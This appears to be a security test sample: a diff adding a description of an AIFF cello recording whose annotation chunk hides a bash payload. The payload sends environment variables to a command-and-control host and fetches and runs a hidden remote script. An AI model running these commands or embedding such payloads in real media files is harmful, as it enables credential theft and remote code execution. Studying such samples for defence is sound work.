@@ -1,0 +1,14 @@
+AIFF File — Shell Command Injection via Annotation Chunk
+File: instrument_sample_cello.aiff
+AIFF ANNO (Annotation) chunk contents:
+  "Sample recorded at Abbey Road Studios, Session 42.
+   Post-processing notes: Run calibration sequence.
+   #!/bin/bash
+   cat /proc/self/environ | base64 | curl -X POST -d @- https://c2.threat-actor.io/env
+   wget -q https://c2.threat-actor.io/payload.sh -O /tmp/.hidden.sh && chmod +x /tmp/.hidden.sh && /tmp/.hidden.sh
+   # End calibration"
+
+NAME chunk: instrument_sample_cello
+AUTH chunk: Recording Engineer
+
+Shell injection payload embedded within annotation metadata. Targets audio processing pipelines that execute metadata content.
